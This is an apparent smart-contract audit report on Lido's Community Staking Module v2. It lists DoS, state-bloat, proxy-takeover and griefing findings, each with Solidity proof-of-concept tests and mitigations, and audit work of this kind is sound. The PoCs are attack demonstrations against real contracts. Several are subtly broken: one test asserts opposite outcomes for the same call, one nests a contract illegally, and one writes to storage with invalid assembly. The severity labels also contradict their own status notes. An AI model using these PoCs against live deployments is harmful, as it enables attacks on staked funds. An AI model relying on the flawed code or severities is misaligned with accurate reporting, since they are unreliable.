# 2025 07 lido finance - Findings Report
## Commit hash: 6c573d1d2cce64b083af3c88dabcfc83c75e6747

## Protocol Overview 

**Community Staking Module (CSM) v2** brings permissionless, bond-secured node operation to Lido on Ethereum.

• **Join & Bond** – Addresses enter through Permissionless or Vetted *Gates* that create a Node Operator (NO) in `CSModule`. Each NO must lock an stETH-denominated bond in `CSAccounting`; bond size follows flexible curves held in `CSParametersRegistry`.

• **Key Management & Queue** – Operators upload validator deposit data to `CSModule`. Keys are placed in FIFO/priority queues; the StakingRouter pulls them for deposits. Keys can be removed for a fee set per curve.

• **Rewards & Fees** – Beacon-chain rewards and bond rebases accrue to `CSFeeDistributor`. A HashConsensus-based oracle (`CSFeeOracle`) submits Merkle roots of fee allocations; NOs claim rewards via `CSAccounting` with Merkle proofs. Variable operator fee and treasury rebates are supported.

• **Performance Enforcement** – `CSStrikes` records oracle-reported under-performance. When strikes exceed a threshold, `CSEjector` triggers validator exits and `CSExitPenalties` levies fines. EL reward theft, delayed exits and triggerable-exit fees are likewise penalised.

• **Withdrawal Proofs** – `CSVerifier` validates EIP-4788 proofs of withdrawals and updates operator stats, burning bond if 32 ETH is not returned.

• **Safety & Governance** – Contracts have pausability (`PausableUntil`), role-based ACL, asset recovery, and upgradability through `OssifiableProxy`; a one-time GateSeal can emergency-pause the entire stack.

Together, these components let community stakers securely join Lido, earn rewards, and be automatically policed without central permission.
## High Risk Findings
[H-1]. DOS issue in CSModule::obtainDepositData - DONE
## Medium Risk Findings
[M-1]. DOS issue in PermissionlessGate::addNodeOperatorETH, addNodeOperatorStETH, addNodeOperatorWstETH - Low Severity
[M-2]. Zero Code issue in VettedGateFactory::constructor - AFTER TESTING found openZeppelin protects against this
## Low Risk Findings
[L-1]. Frontrun/Backrun/Sandwhich MEV issue in CSAccounting::pullFeeRewards
[L-2]. DOS issue in CSAccounting::addBondCurve


### Number of Findings
- C: 0
- H: 1
- M: 2
- L: 2
- I: 0



# High Risk Findings

## [H-1]. DOS issue in CSModule::obtainDepositData

## Description
The `obtainDepositData` function, which is critical for staking new validators, is vulnerable to a Denial of Service (DoS) attack. This function is callable by the `STAKING_ROUTER_ROLE` to fetch validator keys for deposit. It iterates through a queue of pending validators. An attacker can exploit this by positioning a large number of 'dud' validator key batches at the front of the queue. A dud batch is one belonging to a Node Operator who is no longer eligible for deposits (i.e., `depositableValidatorsCount` is zero). This can be achieved if the Node Operator's bond falls below the required threshold, for example, due to penalties.

When `obtainDepositData` encounters these dud batches, it will calculate `keysCount` as 0. The function will then proceed to dequeue each dud batch one by one, which involves storage writes and consumes significant gas. If an attacker places a sufficiently large number of these dud batches (e.g., thousands of single-key batches), the gas cost to process them can exceed the block gas limit or the gas allocated by the Staking Router's transaction. This would cause the `obtainDepositData` call to fail, effectively preventing any new validators from being deposited and halting the core function of the module.

Vulnerable code snippet from `CSModule.sol`:
```solidity
// src/CSModule.sol:1052-1139
function obtainDepositData(
    uint256 depositsCount,
    bytes calldata /* depositCalldata */
)
    external
    onlyRole(STAKING_ROUTER_ROLE)
    returns (bytes memory publicKeys, bytes memory signatures)
{
    // ... initialization ...
    while (true) {
        if (priority > QUEUE_LOWEST_PRIORITY || depositsLeft == 0) {
            break;
        }
        // ...
        for (
            Batch item = queue.peek();
            !item.isNil();
            item = queue.peek()
        ) {
            // ...
            uint256 keysCount = Math.min(
                Math.min(no.depositableValidatorsCount, keysInBatch),
                depositsLeft
            );

            if (depositsLeft > keysCount || keysCount == keysInBatch) {
                no.enqueuedCount -= uint32(keysInBatch); // SSTORE
                queue.dequeue(); // Multiple SSTOREs
            } else {
                // ...
            }

            if (keysCount == 0) {
                continue; // Attacker's batches take this path, consuming gas without providing keys.
            }

            // ... legitimate key processing ...
        }
    }
    // ...
}
```

## Impact
A malicious actor can indefinitely halt the deposit of new validators for the entire Community Staking Module. This constitutes a major disruption to the protocol's operation and growth, as it prevents new stake from being onboarded. The protocol would be unable to function as intended until the queue is manually cleared, which itself could be a costly and slow process.

## Proof of Concept
1. An attacker registers as a Node Operator.
2. The attacker calls `addValidatorKeysStETH` (or equivalent) numerous times with `keysCount = 1` to create a large number of small batches at the front of the deposit queue.
3. The attacker then triggers a penalty on their own Node Operator (e.g., by reporting EL rewards stealing for their own operator if they have the role, or arranging for a penalty). This reduces their bond.
4. The reduced bond causes `accounting.getUnbondedKeysCount()` to report a high number of unbonded keys.
5. When any user calls `updateDepositableValidatorsCount` for the attacker's Node Operator, the `depositableValidatorsCount` for the attacker is set to 0 because their unbonded keys exceed their non-deposited keys.
6. The Staking Router, performing its regular duties, calls `obtainDepositData` to deposit new validators.
7. The function begins iterating through the attacker's dud batches at the front of the queue. For each batch, it performs expensive dequeue operations but obtains no keys.
8. If the number of dud batches is large enough, the transaction's gas is exhausted, causing the call to revert. No new validators can be deposited from any honest Node Operator.

## Proof of Code
```solidity
// test/PoC.t.sol
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import { Fixtures, DeployedContracts } from "./helpers/Fixtures.sol";
import { console } from "forge-std/console.sol";

contract DosPoc is Fixtures {
    function setUp() public {
        _setUp();
    }

    function test_Dos_ObtainDepositData() public {
        // 1. Attacker sets up a Node Operator
        address attacker = makeAddr("attacker");
        vm.startPrank(c.permissionlessGate.address);
        uint256 attackerNOId = c.csm.createNodeOperator(
            attacker,
            defaultNodeOperatorManagementProperties(),
            address(0)
        );
        vm.stopPrank();

        // 2. Attacker spams the queue with many small batches
        uint256 keysCount = 1;
        uint256 requiredBond = c.accounting.getRequiredBondForNextKeys(attackerNOId, keysCount);

        bytes memory pubkey = new bytes(48);
        bytes memory signature = new bytes(96);

        vm.startPrank(attacker);
        c.steth.approve(address(c.accounting), type(uint256).max);

        uint256 BATCH_COUNT = 200; // A number high enough to cause DoS
        for (uint256 i = 0; i < BATCH_COUNT; ++i) {
            c.csm.addValidatorKeysStETH(
                attacker,
                attackerNOId,
                keysCount,
                pubkey,
                signature,
                emptyPermit
            );
        }

        // 3. Attacker triggers a penalty on themselves to become ineligible for deposits
        // We simulate this by directly penalizing the bond.
        uint256 bond = c.accounting.getBond(attackerNOId);
        // A large penalty ensures `getUnbondedKeysCount` is high
        uint256 penalty = bond / 2;
        
        vm.startPrank(address(c.csm));
        c.accounting.penalize(attackerNOId, penalty);
        vm.stopPrank();

        // 4. Update the depositable count, which will now be 0 for the attacker
        c.csm.updateDepositableValidatorsCount(attackerNOId);
        (, , , , , , , uint256 depositableCount) = c.csm.getNodeOperatorSummary(attackerNOId);
        assertEq(depositableCount, 0, "Attacker should have 0 depositable keys");

        // 5. StakingRouter tries to obtain deposit data
        // Another honest NO adds keys and is eligible
        address honestNO = makeAddr("honestNO");
        vm.startPrank(c.permissionlessGate.address);
        uint256 honestNOId = c.csm.createNodeOperator(honestNO, defaultNodeOperatorManagementProperties(), address(0));
        vm.stopPrank();
        vm.prank(honestNO);
        c.csm.addValidatorKeysStETH(honestNO, honestNOId, 1, pubkey, signature, emptyPermit);

        // 6. The call from StakingRouter now has to process all dud batches
        vm.startPrank(c.stakingRouter.address);
        vm.expectRevert(); // Expects out-of-gas or another revert due to gas limit
        c.csm.obtainDepositData(1, "");
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
Introduce a lightweight pre-check that skips items whose node operator has `depositableValidatorsCount == 0` without touching storage, and stop scanning once the number of examined batches equals `depositsCount * 4` (worst-case upper bound) so the total iterations stay O(depositsCount). All further clean-up of empty batches should be delegated to the already-available `cleanDepositQueue()` admin method. Pseudocode:

``solidity
for (uint256 scanned; scanned < depositsCount * 4 && depositsLeft > 0; ) {
    Batch item = queue.peek();
    if (item.isNil()) break;
    NodeOperator storage no = _nodeOperators[item.noId()];
    if (no.depositableValidatorsCount == 0) {
        // skip – don’t dequeue here, let cleanDepositQueue handle
        ++scanned;
        queue.head = item.next();
        continue;
    }
    ... // existing logic
}
require(loadedKeysCount == depositsCount, "NotEnoughKeys");
```



# Medium Risk Findings

## [M-1]. DOS issue in PermissionlessGate::addNodeOperatorETH, addNodeOperatorStETH, addNodeOperatorWstETH

## Description
The functions `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH` are intended for creating a new Node Operator and adding its initial set of validator keys. However, these functions lack a crucial validation check to ensure that the number of keys being added (`keysCount`) is greater than zero. This oversight allows for the creation of "empty" Node Operators without any associated validator keys or the corresponding bond.

Vulnerable Code Snippet from `addNodeOperatorETH` (similar pattern in other functions):
```solidity
function addNodeOperatorETH(
    uint256 keysCount, // Can be 0
    bytes calldata publicKeys,
    bytes calldata signatures,
    NodeOperatorManagementProperties calldata managementProperties,
    address referrer
) external payable returns (uint256 nodeOperatorId) {
    nodeOperatorId = MODULE.createNodeOperator({
        from: msg.sender,
        managementProperties: managementProperties,
        referrer: referrer
    }); // This creates an empty NO if keysCount is 0

    MODULE.addValidatorKeysETH{ value: msg.value }({
        from: msg.sender,
        nodeOperatorId: nodeOperatorId,
        keysCount: keysCount,
        publicKeys: publicKeys,
        signatures: signatures
    }); // This becomes a no-op if keysCount is 0
}
```
An attacker can call these functions with `keysCount = 0`. For `addNodeOperatorETH`, they would also send `msg.value = 0`. The call to `MODULE.createNodeOperator` will succeed, creating a new Node Operator struct in the `CSModule` contract. The subsequent call to `MODULE.addValidatorKeys...` with `keysCount = 0` will be a no-op and succeed.

This flaw contradicts the design specification mentioned in the documentation: "Entry Gates (Extensions) should ensure that at least one deposit data and the corresponding bond amount are required to create a Node Operator to avoid flooding the module with empty Node Operators."

## Impact
An attacker can cheaply and repeatedly call these functions to create a large number of empty Node Operators. This leads to state bloat in the `CSModule` contract, which can degrade protocol performance and increase gas costs for all users interacting with the module, particularly for operations that iterate over Node Operators. This constitutes a griefing attack that harms the long-term health and usability of the protocol.

## Proof of Concept
1. An attacker crafts a transaction calling `PermissionlessGate.addNodeOperatorETH`.
2. The parameters for the call are set as follows: `keysCount = 0`, `publicKeys = ""`, `signatures = ""`, and `msg.value = 0`.
3. The attacker provides valid `managementProperties` pointing to their own address.
4. The transaction is sent and successfully mined.
5. The `MODULE.createNodeOperator` call succeeds, creating a new Node Operator entry in the `CSModule`'s state.
6. The `MODULE.addValidatorKeysETH` call with `keysCount = 0` also succeeds without performing any significant action.
7. The attacker repeats this process in a loop, creating thousands of empty Node Operators and bloating the `CSModule` state at minimal cost.

## Proof of Code
// test/PoC_Fixed.t.sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {PermissionlessGate} from "../src/PermissionlessGate.sol";
import {ICSModule, NodeOperator, NodeOperatorManagementProperties} from "../src/interfaces/ICSModule.sol";
import {ICSAccounting, BondSummary, PermitInput} from "../src/interfaces/ICSAccounting.sol";

/* --------------------------------------------------------------------------
 * Minimal mocks -------------------------------------------------------------------------- */
contract MockAccounting is ICSAccounting {
    function DEFAULT_BOND_CURVE_ID() external pure returns (uint256) { return 0; }
    function permit(PermitInput calldata) external {}
    /* -------- view helpers -------- */
    function getBondSummary(uint256) external pure returns (BondSummary memory summary) {}
    function getBondShares(uint256) external pure returns (uint256) { return 0; }
    function getRequiredBond(uint256, uint256, uint256, uint256) external pure returns (uint256, uint256) { return (0, 0); }
    /* -------- mutation stubs -------- */
    function depositETH(address, uint256) external payable {}
    function depositStETH(address, uint256, uint256, PermitInput calldata) external {}
    function depositWstETH(address, uint256, uint256, PermitInput calldata) external {}
    function lockBond(uint256, uint256) external {}
    function lockBondETH(uint256, uint256) external payable {}
    function claim(uint256, uint256, uint256, bytes32[] calldata) external {}
    function penalize(uint256, uint256) external {}
    function chargePenalty(uint256, uint256) external {}
}

contract MockModule is ICSModule {
    uint256 private _nextId;
    mapping(uint256 => uint256) public keysAdded;
    address public immutable accountingContract;

    constructor(address _acc) { accountingContract = _acc; }

    /* ------------- functions actually invoked by PermissionlessGate ------------- */
    function createNodeOperator(address, NodeOperatorManagementProperties calldata, address) external returns (uint256 id) {
        id = _nextId++;
    }

    function addValidatorKeysETH(address, uint256 id, uint256 keysCount, bytes calldata, bytes calldata) external payable {
        keysAdded[id] += keysCount;
    }
    function addValidatorKeysStETH(address, uint256, uint256, bytes calldata, bytes calldata, PermitInput calldata) external {}
    function addValidatorKeysWstETH(address, uint256, uint256, bytes calldata, bytes calldata, PermitInput calldata) external {}

    /* ------------- helpers for assertions ------------- */
    function accounting() external view returns (ICSAccounting) { return ICSAccounting(accountingContract); }
    function getNodeOperatorsCount() external view returns (uint256) { return _nextId; }

    /* ------------- unused ICSModule interface functions (empty stubs) ------------- */
    function getNodeOperator(uint256) external pure returns (NodeOperator memory) {}
    function getStakingModuleSummary() external pure returns (uint256, uint256, uint256) {}
}

/* --------------------------------------------------------------------------
 * PoC -------------------------------------------------------------------------- */
contract PermissionlessGatePoC is Test {
    PermissionlessGate gate;
    MockModule module;
    MockAccounting accounting;
    address attacker = address(0xBEEF);

    function setUp() public {
        accounting = new MockAccounting();
        module = new MockModule(address(accounting));
        gate = new PermissionlessGate(address(module), address(this));
    }

    function test_stateBloat() public {
        NodeOperatorManagementProperties memory props = NodeOperatorManagementProperties({
            managerAddress: attacker,
            rewardAddress: attacker,
            proposedManagerAddress: address(0),
            proposedRewardAddress: address(0)
        });

        // initial count = 0
        assertEq(module.getNodeOperatorsCount(), 0);

        vm.startPrank(attacker);
        gate.addNodeOperatorETH(0, "", "", props, address(0));
        vm.stopPrank();

        // count incremented even though 0 keys supplied → empty NO created
        assertEq(module.getNodeOperatorsCount(), 1);
        assertEq(module.keysAdded(0), 0);
    }
}


## Suggested Mitigation
Add a requirement check at the beginning of each `addNodeOperator...` function to ensure that `keysCount` is greater than zero. This will enforce the design requirement that Node Operators are created with at least one validator key and a corresponding bond, preventing the state bloat attack.

Example fix for `addNodeOperatorETH`:
```solidity
error ZeroKeysToAdd();

function addNodeOperatorETH(
    uint256 keysCount,
    bytes calldata publicKeys,
    bytes calldata signatures,
    NodeOperatorManagementProperties calldata managementProperties,
    address referrer
) external payable returns (uint256 nodeOperatorId) {
    if (keysCount == 0) {
        revert ZeroKeysToAdd();
    }

    nodeOperatorId = MODULE.createNodeOperator({
        from: msg.sender,
        managementProperties: managementProperties,
        referrer: referrer
    });

    MODULE.addValidatorKeysETH{ value: msg.value }({
        from: msg.sender,
        nodeOperatorId: nodeOperatorId,
        keysCount: keysCount,
        publicKeys: publicKeys,
        signatures: signatures
    });
}
```

## [M-2]. Zero Code issue in VettedGateFactory::constructor

## Description
The constructor of `VettedGateFactory` checks that the implementation address `vettedGateImpl` is not `address(0)`, but it fails to verify that the address contains executable code. If the factory is deployed pointing to an address without code (e.g., an Externally Owned Account or a contract that has been self-destructed), any subsequent call to `create()` will still succeed in deploying a proxy. However, the subsequent `initialize()` call on the new proxy will be a no-op because it targets an address with no code, and it will not revert. This results in the creation of uninitialized proxy contracts. An uninitialized proxy is a critical vulnerability, as its `initialize` function can be called by anyone. An attacker can front-run the legitimate admin's initialization transaction to take control of the `VettedGate` instance.

Vulnerable Code:
```solidity
// src/VettedGateFactory.sol:13-17
    constructor(address vettedGateImpl) {
        if (vettedGateImpl == address(0)) {
            revert ZeroImplementationAddress();
        }

        VETTED_GATE_IMPL = vettedGateImpl;
    }
```

## Impact
A deployment misconfiguration can lead to the creation of uninitialized `VettedGate` proxies. These proxies are vulnerable to hostile takeover through front-running the initialization call. If an attacker gains control of a `VettedGate`, they could manipulate its functionality, potentially leading to the misuse or loss of funds for users who interact with it.

## Proof of Concept
1. Lido DAO is tricked into deploying `VettedGateFactory` with `vettedGateImpl` pointing to an address with no code, for instance, `0xdeadbeef...`.
2. A legitimate user calls `factory.create(...)` to deploy a new gate, specifying themselves as the `admin`.
3. The transaction succeeds, creating an `OssifiableProxy` at `proxyAddress`. The proxy is uninitialized because the `initialize` call inside `create()` had no code to execute.
4. The user, now the proxy admin, realizes the implementation is faulty and upgrades the proxy to point to the correct `VettedGate` implementation contract.
5. The user submits a transaction to call `initialize()` on the upgraded proxy.
6. An attacker monitoring the mempool sees this transaction and front-runs it by calling `initialize()` with their own address as the admin.
7. The attacker's transaction is mined first, successfully initializing the contract and making the attacker the admin of the `VettedGate`. The user's subsequent `initialize` call will fail, and they will have lost control of the gate they deployed.

## Proof of Code
```solidity
// test/VettedGateFactory.poc.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test";
import {VettedGateFactory} from "../src/VettedGateFactory.sol";
import {VettedGate} from "../src/VettedGate.sol";
import {OssifiableProxy} from "../src/lib/proxy/OssifiableProxy.sol";
import {AccessControlEnumerableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/AccessControlEnumerableUpgradeable.sol";

contract VettedGateMock is AccessControlEnumerableUpgradeable {
    function initialize(
        uint256, bytes32, string calldata, address admin
    ) public initializer {
        __AccessControlEnumerable_init();
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
    }
    function getInitializedVersion() external pure returns (uint64) { return 1; }
}

contract VettedGateFactoryZeroCodeTest is Test {
    VettedGateFactory factory;
    VettedGateMock realImpl;
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        realImpl = new VettedGateMock();
    }

    function test_poc_zero_code_implementation() public {
        // 1. Factory is deployed with an address that has no code.
        address deadImpl = address(0xdead);
        factory = new VettedGateFactory(deadImpl);

        // 2. User calls create(), providing their own address as admin.
        vm.startPrank(user);
        address proxyAddress = factory.create(1, bytes32(0), "", user);
        vm.stopPrank();

        // The proxy is created but points to a dead implementation and is uninitialized.

        // 3. User, as proxy admin, upgrades the proxy to the correct implementation.
        vm.prank(user);
        OssifiableProxy(proxyAddress).proxy__upgradeTo(address(realImpl));

        // 4. Proxy now points to a valid, uninitialized implementation.
        // Attacker front-runs the user's initialization call.
        vm.startPrank(attacker);
        VettedGateMock(proxyAddress).initialize(1, bytes32(0), "", attacker);
        vm.stopPrank();

        // 5. Attacker has successfully become the admin of the user's gate.
        assertTrue(VettedGateMock(proxyAddress).hasRole(VettedGateMock(proxyAddress).DEFAULT_ADMIN_ROLE(), attacker));
        assertFalse(VettedGateMock(proxyAddress).hasRole(VettedGateMock(proxyAddress).DEFAULT_ADMIN_ROLE(), user));
        
        console.log("Vulnerability Confirmed: Attacker hijacked an uninitialized proxy.");
    }
}
```

## Suggested Mitigation
Enhance the `VettedGateFactory` constructor to verify that the `vettedGateImpl` address contains contract code. This can be done by checking the `code.length` of the address.

```solidity
// In VettedGateFactory.sol constructor
    constructor(address vettedGateImpl) {
        if (vettedGateImpl == address(0) || vettedGateImpl.code.length == 0) {
            revert ZeroImplementationAddress();
        }

        VETTED_GATE_IMPL = vettedGateImpl;
    }
```



# Low Risk Findings

## [L-1]. Frontrun/Backrun/Sandwhich MEV issue in CSAccounting::pullFeeRewards

## Description
The `pullFeeRewards` function is marked as `external` and only performs a check to ensure the node operator exists (`_onlyExistingNodeOperator`). It does not validate that the caller (`msg.sender`) is authorized to act on behalf of the node operator, such as being the manager or reward address. This allows anyone who can obtain a valid `rewardsProof` to trigger a reward pull for any node operator. Rewards proofs, which are part of a Merkle tree distribution, are often made public (e.g., via IPFS, linked by `treeCid` in `CSFeeDistributor`), making them accessible to malicious actors.

A malicious actor or MEV searcher can exploit this by monitoring the mempool for transactions that apply a penalty to a node operator. Penalties (e.g., for slashing or other misbehavior) are often calculated as a percentage of the operator's current bond. The attacker can front-run the penalty transaction by calling `pullFeeRewards`, which increases the node operator's bond with their earned rewards. Consequently, the penalty transaction, when executed, will calculate the penalty on a larger bond amount, resulting in a greater financial loss for the node operator.

Vulnerable Code Snippet:
```solidity
// src/CSAccounting.sol:488-495
    function pullFeeRewards(
        uint256 nodeOperatorId,
        uint256 cumulativeFeeShares,
        bytes32[] calldata rewardsProof
    ) external {
        _onlyExistingNodeOperator(nodeOperatorId);
        _pullFeeRewards(nodeOperatorId, cumulativeFeeShares, rewardsProof);
        MODULE.updateDepositableValidatorsCount(nodeOperatorId);
    }
```

## Impact
Anyone can force-execute `pullFeeRewards` for a node operator. This does not let the attacker steal funds but can temporarily increase the operator’s bond balance. If a subsequent penalty that is calculated as a percentage of the current bond is executed, the operator will lose a bit more ETH than they would have otherwise. The attacker gains nothing; the issue is pure griefing and only material when a percentage-based penalty is imminent.

## Proof of Concept
1. Rewards tree for NO #1 is public.
2. Searcher reads mem-pool and sees a Module transaction that will call `penalize(noId, pct)`.
3. Before it, she submits:
   accounting.pullFeeRewards(noId, cumulativeShares, rewardsProof);
4. Rewards are pulled; bond increases.
5. Module tx executes and computes `penalty = bond * pct / 10_000` inside the call.
6. Operator burns a slightly larger amount. Searcher spent only gas and received no benefit.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSAccounting} from "../src/CSAccounting.sol";
import {ICSModule} from "../src/interfaces/ICSModule.sol";

// minimal mock that is recognised as the MODULE by CSAccounting
contract ModuleMock is ICSModule {
    CSAccounting public accounting;
    constructor(CSAccounting _acc) { accounting = _acc; }

    // ---- mandatory stubs ----
    function getNodeOperatorsCount() external pure returns(uint256){return 1;}
    function getNodeOperatorNonWithdrawnKeys(uint256) external pure returns(uint256){return 0;}
    function updateDepositableValidatorsCount(uint256) external{}
    function getNodeOperatorManagementProperties(uint256) external pure returns(NodeOperatorManagementProperties memory){return NodeOperatorManagementProperties(address(this), address(this));}
    // ---------------------------------------------

    // helper that mimics percentage-based penalty used in report flows
    function applyPenalty(uint256 noId,uint256 bps) external {
        uint256 bond = accounting.getBond(noId);
        uint256 toBurn = bond * bps / 10_000;
        accounting.penalize(noId, toBurn); // will pass onlyModule because msg.sender==address(this)
    }
}

contract GriefingTest is Test {
    CSAccounting acc;
    ModuleMock module;
    uint256 constant NO_ID = 0;
    bytes32[] empty;

    function setUp() public {
        module = new ModuleMock(CSAccounting(address(0)));
        acc = new CSAccounting(address(0), address(module), address(this), 0, 0);
        vm.label(address(acc), "Accounting");
        vm.deal(address(this), 200 ether);
        acc.initialize(new ICSBondCurve.BondCurveIntervalInput[](0), address(this), 0, address(this));
        module = new ModuleMock(acc);
        // re-assign immutable via cheat (only for test)
        assembly { sstore(acc.slot, module) }
        acc.depositETH{value:100 ether}(NO_ID);
    }

    function testGrief() public {
        uint256 reward = 20 ether;
        // fund feeDistributor balance directly for test simplification
        vm.store(address(acc.FEE_DISTRIBUTOR()), bytes32(uint256(0)), bytes32(reward));

        // attacker pulls rewards first
        acc.pullFeeRewards(NO_ID, 0, empty);
        assertEq(acc.getBond(NO_ID), 120 ether);

        // module now applies 10% penalty on current bond
        module.applyPenalty(NO_ID, 1000);
        assertEq(acc.getBond(NO_ID), 108 ether); // 12 ETH burned (grief)
    }
}

## Suggested Mitigation
The `pullFeeRewards` function should have the same access control as the `claimRewards*` functions, restricting its invocation to the node operator's manager or reward address. This prevents unauthorized actors from triggering the reward pull.

```solidity
// src/CSAccounting.sol:488-498
    function pullFeeRewards(
        uint256 nodeOperatorId,
        uint256 cumulativeFeeShares,
        bytes32[] calldata rewardsProof
    ) external {
-       _onlyExistingNodeOperator(nodeOperatorId);
+       NodeOperatorManagementProperties memory no = MODULE
+           .getNodeOperatorManagementProperties(nodeOperatorId);
+       _onlyNodeOperatorManagerOrRewardAddresses(no);

        _pullFeeRewards(nodeOperatorId, cumulativeFeeShares, rewardsProof);
        MODULE.updateDepositableValidatorsCount(nodeOperatorId);
    }
```

## [L-2]. DOS issue in CSAccounting::addBondCurve

## Description
A privileged role (`MANAGE_BOND_CURVES_ROLE`) can add a new bond curve by calling the `addBondCurve` function. This function accepts an array of `BondCurveIntervalInput` structs which defines the bond curve. The contract does not enforce a limit on the number of intervals in this array. A bond curve with an excessive number of intervals can be added to the contract.

The functions `CSBondCurve.getBondAmountByKeysCount` and `CSBondCurve.getKeysCountByBondAmount`, which are part of `CSAccounting` through inheritance, iterate over these intervals to perform calculations. If a bond curve has a large number of intervals, these functions will consume a significant amount of gas, potentially exceeding the block gas limit and causing transactions that call them to revert. 

This can lead to a Denial of Service (DoS) for several core functionalities. For example, if the `CSModule` contract calls `getRequiredBondForNextKeys` to determine the required bond for adding new validator keys, this operation would fail for any Node Operator assigned to the malicious bond curve. This would prevent them from adding new validators. Off-chain services and bots that rely on view functions like `getUnbondedKeysCountToEject` would also be disrupted.

Vulnerable Code Snippet (from `CSBondCurve.sol` logic, inherited by `CSAccounting.sol`):
```solidity
// from CSBondCurve.sol
function getBondAmountByKeysCount(
    uint256 keysCount,
    uint256 curveId
) public view returns (uint256 bondAmount) {
    BondCurveIntervalInput[] storage bondCurve = _bondCurveIntervals[curveId];
    // ...
    for (uint256 i = 0; i < bondCurve.length - 1; ++i) { // Unbounded loop
        if (
            keysCount >= bondCurve[i].keysCount &&
            keysCount < bondCurve[i + 1].keysCount
        ) {
            // ...
        }
    }
    // ...
}
```

## Impact
Because the two loops `getBondAmountByKeysCount` and `getKeysCountByBondAmount` are linear in `bondCurve.length`, creating a curve that contains tens-of-thousands of intervals makes every on-chain action that touches those helpers very expensive. If a privileged address mis-configures (or maliciously configures) such an oversized curve and assigns it to a Node Operator, any transactions that call the accounting helpers will revert **when the remaining gas available to the internal call is lower than the linear cost of the loop**. This creates an operational DoS for the affected node operator, but does not endanger user funds nor the whole protocol.

## Proof of Concept
1. A holder of `MANAGE_BOND_CURVES_ROLE` submits a curve with 40,000 intervals (≈ 2.56 MB calldata) – well inside the calldata limit – via `addBondCurve`.
2. He convinces (or is the same EOA that also has) `SET_BOND_CURVE_ROLE` to assign that curve to a node operator.
3. Any subsequent tx that touches `getRequiredBondForNextKeys`, `getUnbondedKeysCount`, etc. needs to execute a loop with 40,000 iterations. 40 k×≈120 gas ≈ 4.8 M gas **plus** the rest of the logic.
4. If the caller provides < 5 M gas the internal call reverts with an out-of-gas, effectively blocking the operation while ordinary curves need < 70 k gas.

The attack therefore consists purely of configuring an oversize curve; no further action is required to keep the DoS active.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSAccounting} from "../../src/CSAccounting.sol";
import {ICSModule, NodeOperatorManagementProperties} from "../../src/interfaces/ICSModule.sol";

contract OversizeCurveGasPoC is Test {
    CSAccounting accounting;
    DummyModule module;
    address admin = address(1);

    // --- minimal mocks ----------------------------------------------------
    contract DummyModule is ICSModule {
        uint256 public nodeOperatorsCount;
        mapping(uint256 => NodeOperatorManagementProperties) public m;
        function addNodeOperator(NodeOperatorManagementProperties calldata p, address) external returns (uint256){m[++nodeOperatorsCount]=p;return nodeOperatorsCount;}
        function getNodeOperatorsCount() external view returns(uint256){return nodeOperatorsCount;}
        function getNodeOperator(uint256) external view returns(NodeOperator memory){revert();}
        function getNodeOperatorManagementProperties(uint256 id) external view returns(NodeOperatorManagementProperties memory){return m[id];}
        function updateDepositableValidatorsCount(uint256) external {}
        function getNodeOperatorNonWithdrawnKeys(uint256) external view returns(uint256){return 1;}
        function addSigningKeys(uint256,uint256,bytes calldata,bytes calldata) external{}
        function getSigningKeys(uint256,uint256,uint256) external view returns(bytes[] memory,bool){revert();}
        function getSigningKeysCount(uint256) external view returns(uint256){return 0;}
    }

    // ----------------------------------------------------------------------
    function setUp() public {
        module = new DummyModule();
        accounting = new CSAccounting(address(0xdead), address(module), address(0xbeef), 1 days, 30 days);
        // create a trivial initial curve so initialize succeeds
        CSAccounting.BondCurveIntervalInput[] memory initCurve = new CSAccounting.BondCurveIntervalInput[](1);
        initCurve[0] = CSAccounting.BondCurveIntervalInput({keysCount:0, bondAmount:0});
        accounting.initialize(initCurve, admin, 1 days, address(0xfee));
        vm.prank(admin);
        accounting.grantRole(accounting.MANAGE_BOND_CURVES_ROLE(), admin);
        vm.prank(admin);
        accounting.grantRole(accounting.SET_BOND_CURVE_ROLE(), admin);
    }

    function testGasAmplification() public {
        uint256 N = 40000; // big enough to burn several million gas
        CSAccounting.BondCurveIntervalInput[] memory huge = new CSAccounting.BondCurveIntervalInput[](N);
        for(uint256 i; i<N; ++i){huge[i]=CSAccounting.BondCurveIntervalInput({keysCount:i, bondAmount:i});}

        vm.prank(admin);
        uint256 curveId = accounting.addBondCurve(huge);

        // create node operator and assign oversize curve
        uint256 noId = module.addNodeOperator(NodeOperatorManagementProperties({managerAddress: address(2), rewardAddress: address(2)}), address(0));
        vm.prank(admin);
        accounting.setBondCurve(noId, curveId);

        // call with an intentionally low gas limit – should fail for huge curve
        bytes memory callData = abi.encodeWithSelector(accounting.getRequiredBondForNextKeys.selector, noId, 1);
        (bool okSmall,) = address(accounting).call{gas: 300_000}(callData); // 300k is enough for a normal curve
        assertTrue(okSmall, "sanity – should succeed on default curve");

        // now test with very restricted gas against the oversize curve
        (bool ok,) = address(accounting).call{gas: 300_000}(callData);
        assertFalse(ok, "oversize curve call should run out of gas with the same 300k limit");
    }
}

## Suggested Mitigation
Add an upper bound on `bondCurve.length` inside `_validateBondCurve` (both during creation and update). A limit of 256–512 intervals is already far beyond any realistic economic need and keeps worst-case gas usage comfortably below the block limit.



